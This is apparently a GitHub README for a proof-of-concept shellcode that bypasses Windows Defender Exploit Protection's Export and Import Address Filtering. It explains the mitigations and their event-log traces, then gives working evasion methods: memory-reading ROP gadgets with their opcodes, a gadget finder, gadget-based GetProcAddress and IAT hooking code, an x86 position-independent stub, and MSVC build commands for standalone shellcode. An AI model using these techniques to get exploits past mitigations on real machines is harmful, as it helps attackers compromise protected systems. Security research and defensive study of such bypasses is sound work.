# IAF & EAF Shellcode bypass PoC

This repository contains source code for shellcode which is capable of bypassing **EAF (EAF+)** and **IAF** mitigations provided by Windows Defender Exploit Protection (Win11 / Win10).
I wanted to learn more about these mitigations and I couldn't find much info related to this, so here we go, I hope somebody will find this useful aswell. 
_This repo is for educational purposes only_

**Also you can find here an approach to shellcode compilation in C using MSVC's compiler, linker and assembler.
**
*Both x64 and x86 shellcodes are supported.*

Shellcode was tested on `22621.1.amd64fre.ni_release.220506-1250`, `19041.1.amd64fre.vb_release.191206-1406` and `W8.1 Pro 6.3.9600 Build 9600 with EMET applied`

## EAF
This mitigation tries to find shellcodes running in the memory by applying *PAGE_GUARD*s on Export Address Table of modules like `ntdll.dll`, `kernelbase.dll` and `kernel32.dll`.

All of this is happening in `PayloadRestrictions.dll` library which is loaded into the desired process.
It will register new VEH which is activated after accessing *PAGE_GUARD* protected page.
This handling basically checks the RIP/EIP of the accessing instruction and if this memory is not backed by a module on the disk it will get terminated with 0xc0000409 error code aka. buffer overrun - it's not a bug.
This check is done by [RtlPcToFileHeader](https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlpctofileheader)

Before the program actually terminates an event is written into the event log. 
One can be found in basic `Windows Logs/Application` subfolder and it looks similar to this (different offset etc.):
```
Faulting application name: runner.exe, version: 0.0.0.0, time stamp: 0x641749db
Faulting module name: payloadRestrictions.dll, version: 10.0.22621.1194, time stamp: 0x10c91e26
Exception code: 0xc0000409
Fault offset: 0x000000000004b37d
Faulting process id: 0x0x1530
Faulting application start time: 0x0x1D95AA34DE8A7DA
Faulting application path: Z:\runner.exe
Faulting module path: C:\WINDOWS\SYSTEM32\payloadRestrictions.dll
Report Id: 236602a4-a655-4c54-a260-6d54295804dc
Faulting package full name:
Faulting package-relative application ID:
```

and other one in `Applications and Services Logs/Microsoft/Windows/Security-Mitigations/User Mode`. This one is more user-friendly.
```
Process 'Z:\runner.exe' (PID 5424) was blocked from accessing the Export Address Table for module 'C:\WINDOWS\System32\kernelbase.dll'.
```

This mitigation also has 2 options

### Audit Only
This one is pretty obvious, the check will not terminate the process but will generate an event such as this:
```
Process 'Z:\runner.exe' (PID 21724) would have been blocked from accessing the Export Address Table for module 'C:\WINDOWS\System32\kernel32.dll'.
```
This could be used for threat hunting

### Validate access for modules that are commonly abused by exploits
And this option enables EAF+ which will add the same protections to [more modules](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference?view=o365-worldwide#configuration-options-10).
In addition it should protect the memory page which contains DOS header. However this was not confirmed during my testing at all.

Finally this mitigation also allows any module to be added under the protection with `EAFModules` registry key under `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable filename>`.

Based on [this ETW research](https://github.com/palantir/exploitguard) EAF should include 3 types of checks. 
1. check for floating RX page / non backed code page - which was observed.
2. check stack registers which could fall outside the stack memory of current thread - observed only in x86 version
3. check that a memory reading gadget is used for accessing the memory - sadly not observed.

I am not sure why the last one wasn't triggered at all, I suppose it was removed.

## IAF
This mitigation works exactly like EAF by applying *PAGE_GUARD* protection on all Import Address Tables, but only check for [certain critical APIs](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference?view=o365-worldwide#import-address-filtering-iaf) which are often used in exploitation. This mitigation mainly exists because shellcodes/exploits might replace IAT functions to redirect execution - EAF on the other hand is supposed to make finding the important API functions impossible/hard.

Even here we have `Audio Only` option and it works just like above.

## Bypass
Essentially we as attackers could have multiple options how to bypass these mitigations

### EAF/EAF+ only
(The EAF+ effects were not observed at all - I might've just missed them somehow, but I never crashed there)

#### IAT approach
If we know that the program uses EAF mitigation only, then we can skip the whole process of looking up export address table. Instead we can just find `GetProcAddress` in any IAT available such as `kernel32.dll`. Afterwards we can use legitimate API for such task which is backed by a module on a disk.

For such cases I've implemented `GetProcAddressIAT_Normal` function which can find the desired API.

But this approach comes with problems on it's own. For example kernel32 doesnt import `GetProcAddress` on older windows machines, where kernelbase wasn't present. But you could theoretically develop a function which will lookup every module's IAT in the process and hope for the best.

#### Gadget bypass
If the IAT problem doesn't seem worth it to you we can universally bypass the mitigation itself.
Since the mitigation checks backed up code we can find any memory reading gadgets such as:

```assembly
mov rax, qword ptr [rax + 0x16a8] ; ret
mov rax, qword ptr [rax + 0x17b8] ; ret
mov rax, qword ptr [rax + 0x17c0] ; ret
mov rax, qword ptr [rax + 0x38] ; ret
mov rax, qword ptr [rax + 0x60] ; ret
mov rax, qword ptr [rax] ; ret
```

They will do all the hardwork of reading the protected memory and return to our shellcode afterwards. I found that these gadgets were present in a lot of modules in one form or another.
Registers used could be easily changed in the code.

There is one problem in these instructions. They are not backwards compatible with 32bit applications. But fear not there are equivalents in dword versions aswell:

```
mov eax, dword ptr [eax + 0x14] ; ret // 8b4014c3
mov eax, dword ptr [eax + 0x16b0] ; ret // 8b80b0160000c3
mov eax, dword ptr [eax] ; ret // 8b00c3
```

### IAF only
The mitigation itself doesn't revolve around reading pointers to critical APIs, it's main use is to block IAT hijacking. However the way it's implemented is that the buffer of the IAT API is subject to the protection - we can walk the IAT all day long without getting the function name.

Hooking the IAT will need a custom strcmp function which uses read gadgets to get the chars for comparison. We can use the same one from the above. Also we can still lookup and change other functions, however if we happen to access any protected function we will get terminated.

#### Write primitive
At the start I thought that the IAT pointers are also a subject to the protection.
And I was mistaken but only after doing all the work. So the source code contains also write gadgets which are not really required and it should work without them.

My theory is that this would cause some serious delays - IAT is accessed quite often.

### EAF/EAF+ and IAF
If both mitigations work together then we lose one of our options to bypass EAF.
Now we cannot access some important APIs such as `GetProcAddress` and thus we rely only on our memory reading gadgets.

I see the memory reader gadgets as the universal bypass to both mitigations and finding these gadgets is pretty easy, they are not rare at all.

## Implementation

### Gadget finder
Before we do anything 'evil' we need to find said gadgets. This is done using `find_read_gadget` which takes reference to a gadget struct.
```c
rop_gadget read_gadget;
SecureZeroMemory(&read_gadget, sizeof(read_gadget));
short int found = find_read_gadget(&read_gadget);
```
This will enumerate all modules in the `PEB` and attempt to find opcodes in the `.text` sections.
You can develop your own `GetProcAddress` or `GetModuleHandle` but they are very much known and I used implementations from this [awesome paper](https://vxug.fakedoma.in/papers/VXUG/Exclusive/FromaCprojectthroughassemblytoshellcodeHasherezade.pdf) and modified them accordingly.

If found in the module, the gadget's address is saved along with it's offset and negative value.
```c
typedef struct rop_gadget
{
    char * Address;
    int Offset;
    char Negative;
} rop_gadget;
```

What is offset and negative you ask?
Well if we have a look at the gadgets used:
```c
mov rax, qword ptr [rax + 0x16a8] ; ret
mov rax, qword ptr [rax + 0x60] ; ret
mov rax, qword ptr [rax] ; ret
-------------------------------
mov eax, dword ptr [eax + 0x14] ; ret // 8b4014c3
mov eax, dword ptr [eax + 0x16b0] ; ret // 8b80b0160000c3
mov eax, dword ptr [eax] ; ret // 8b00c3
```

There are multiple types. If we want to have broader arsenal we need to be prepared for the offsetted ones aswell.
Therefore we have to figure out the type of the gadget and it's offset which is done by looking at the third byte. This decides the offset number size - char, short int or dword (We also check the end bytes to be valid gadgets):
```c
short int first_bool = gadget_memory[2] == '\x00' && gadget_memory[3] == '\xc3' && gadget_memory[4] == '\xcc';

short int second_bool = gadget_memory[2] == '\x40' && gadget_memory[4] == '\xc3' && gadget_memory[5] == '\xcc';

short int third_bool = gadget_memory[2] == '\x80' && gadget_memory[7] == '\xc3' && gadget_memory[8] == '\xcc';
```
*Yes if the gadget is inline, without `\xcc` byte, we are not gonna find it, but without this we could land inside some random instruction which used `\xc3` as it's parameter / argument*

The problem comes from the number itself as it is signed. And I couldn't figure out easy way how to check the signness, because there is one wrapper function which takes bigger registers and the `sub` instruction would subtract the whole one.
This means I would need to make conditions inside assembly, but I would still need to keep the information somewhere, so we can just check if it's negative or not and then use absolute value of our offset number.

*The same algorithm goes for the write gadgets, but different opcodes and no offsets - was lazy*

### GetProcAddress gadget version
Finally here we want to find desired APIs from EAT. We just pass the read_gadget as reference to our custom `GetProcAddress`:
```c
ptrCreateProcessW _CreateProcessW = help_GetProcAddress((HMODULE)kernelbase,(LPSTR)CreateProcessW_char, &read_gadget);
ptrGetStdHandle _GetStdHandle = help_GetProcAddress((HMODULE)kernelbase,(LPSTR)GetStdHandle_char, &read_gadget);
```

And inside the function itself we need to change the way some variables are acquired.
```c
original:

DWORD funcsListRVA = exp->AddressOfFunctions;  
DWORD funcNamesListRVA = exp->AddressOfNames;  
DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals

---------------------------------------------------

DWORD funcsListRVA = read_primitive_int(gadget->Address,(char *)exp+offsetof(IMAGE_EXPORT_DIRECTORY,AddressOfFunctions), gadget->Offset, gadget->Negative);
DWORD funcNamesListRVA = exp->AddressOfNames;
DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;
```
*Basically when I was debugging this I would crash on the first access, therefore `exp->AddressOfFunctions` is one of the protected and watched variables.
However, upon further testing, I found out that the other ones do not trigger EAF at all.*

And this is essentially all, since the string itself is not being checked - this can be easily modified if necessary.

#### x86
In 32bit version we need to make sure, that there isn't invalid `ebp` register. If there is, EAF+ will terminate the process.

### HookIATFunction gadget version

First you need to parse IAT and loop through it. Once gain this is well known and you can use any public made IAT lookup function. I used [this](https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking) because it's one of the first things that I found.

One of the first things I noticed is that sometimes the pointer have some weird byte at the start - I am really not sure why is that, but would love to know
So we just check the first byte to be null
```c
short int first_byte = ((unsigned char *)(&functionName))[7];
if(first_byte == 0){
```

Only thing that we need to change now is the comparison function, cuz mitigation check the strings.
```c
int help_strcmp(const char *target, const char *source, char* gadget, int offset, char negative)
{

int i;

for (i = 0; source[i] == read_primitive_char(gadget, (char* )target + i, offset, negative); i++)

    if (source[i] == '\0')

        return 0;

return source[i] - read_primitive_char(gadget, (char* )target + i, offset, negative);
}
```

Essentially this function uses `read_primitive_char` as the way to access the byte. And In the IAT hooking we just use it as comparison function.
```c
if(help_strcmp(functionName->Name,func_name,read_gadget->Address,read_gadget->Offset,read_gadget->Negative) == 0){
.....
```

And finally the part that I did by accident:
```c
int old;
_VirtualProtect(&firstThunk->u1.Function,8,PAGE_READWRITE,&old);

//firstThunk->u1.Function = new_func_pointer;

write_primitive(write_gadget->Address,(char *)firstThunk + offsetof(IMAGE_THUNK_DATA,u1.Function),new_func_pointer);

_VirtualProtect(&firstThunk->u1.Function,8,old,&old);
```
*Here you can normally use the commented line, it should work as intended.
Also the last virtual protect might not be neccessary.*

## Compilation
There are 3 powershell scripts used for this project.
1. Dump-Bin
2. build_shell
3. build_main

Dump-Bin is essential part for dumping the `.text` section of our shellcode and it uses `objdump.exe` which is part of `mingw` - you can also download it somewhere I am sure.

The compilation process itself is done using *Microsoft MSVC* compiler and assembler. The script assumes you are working from Developer command prompt / pwsh and you have access to the Visual studio tools.

If you want to build the shellcode runner use `build_main.ps1`. It takes `Build` parameter to decide if you want x86 or x64 bit. But make sure you are in the desired developer command prompt version.

### Build Shellcode
Compiling position independent code is very problematic, since you have many restrictions which are usually not a concern. 

This approach was inspired from the [paper mentioned before](https://vxug.fakedoma.in/papers/VXUG/Exclusive/FromaCprojectthroughassemblytoshellcodeHasherezade.pdf).
However the original way required manual editing the assembly, removing sections, adding the call stub which will jump into the main function and most of the stuff would need to be in one source file - which is horrendous. It could be done with this [utility program](https://github.com/hasherezade/masm_shc) made by the author of the paper hasherezade.

However we can automate this pretty easily without using the utility.
Compile our c source codes like this:
```powershell
cl.exe /Zp8 /c /nologo /Od /GR- /EHa /GS- /W0 /MT /Tc shellcode.c
```
Important part are the optimizations, they are very unexpected and might ruin your shellcode. I would disable them all together if you want to store many strings on the stack. But otherwise they are pretty good for removing useless size.

And we can compile our assembly files:
```powershell
$assembler /c .\rop.asm .\align.asm
```
Nothing fancy here

The fun part and the most important one comes in the linking process. 
1. First of all here we need to specify `/ENTRY` parameter which removes CRT and will make your binary small without any IAT imports. This will point to the assembly stub.
2. Second you need make sure the assembly stub with our shellcode start function is the first one to be linked.
```powershell
link.exe /OUT:$out /OPT:NOREF /OPT:NOICF /nologo align.obj shellcode.obj ....
```

From here the script will dump it for you - but you can do it manually if you need to.

### Cautions
The assembly stub for the x64 shellcode version is the exact same as from the paper. 
But the problems appear in the x86 version.

For some reason the compiler will not generate relative addresses if you want to load local functions pointer. This means your shellcode will use the fixed address of the desired function.
This issue can be solved by finding the address of the shellcode in the memory and the adding the hardcoded offset of our function.

Finding the shellcode memory start is done inside the assembly stub in `align.asm`.
```asm
_main PROC
    sub esp,4               ; Make a space
    call _get_current_eip   ; Call get address 
    sub eax, 8              ; Subtract 8 from the result to get the first instruction
    mov [esp], eax          ; Set result into empty space on stack
    call _main_x86          ; Call the entry point of the payload
    add esp,4               ; Remove the result or we will be in an infinite loop
    ret                     ; Return to caller
_main ENDP

_get_current_eip PROC
	mov eax, [esp]
	ret
_get_current_eip ENDP
```
We get the current `eip` by calling into `_get_current_eip` which will leave return address on the stack which we can move into `eax` register.
This result is substracted by 8, because the first 2 instructions will be 8 bytes long.
Finally we pass this as an argument into main function which now holds the shellcode's address.

To get the desired pointer:
```c
void * hook_func_temp = hook_function;
int offset = (char *) hook_func_temp - 0x401000;
void * hook_func = (void *)(shellcode_address + offset);
```
`hook_func_temp` will hold absolute address. This offset can be found by subtracting:
$$default\_image\_base\_address + 0x1000$$
(0x1000 is offset to `.text`)
And finally we add them together to get the real function pointer.

## Demo
If you want to try the bypass yourself, then you need to enable EAF and IAF mitigations on the `runner` executables and then run them using any prompt.

The shellcode overwrites IAT and executed `dir` command. If the IAT is overwritten runner will print a message.

In case you want to build them yourself, make sure you are in developer prompt, you have `objdump.exe` in your environment variables and be in the repo directory.
```powershell
.\build_main.ps1 -Build x86 # 32 bit

.\build_main.ps1 -Build x64 # 64 bit
```
This will build runners inside bin directory.

You can also build the standalone shellcodes using the script - the conditions remain the same.
There you can specify `Debug` builds to link them into full binary with CRT for debugging purposes.

## Thanks
I would like to thank [hasherezade](https://github.com/hasherezade) for the awesome read.
Also [mantvydasb](https://github.com/mantvydasb) for the amazing [red team notes](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques) .



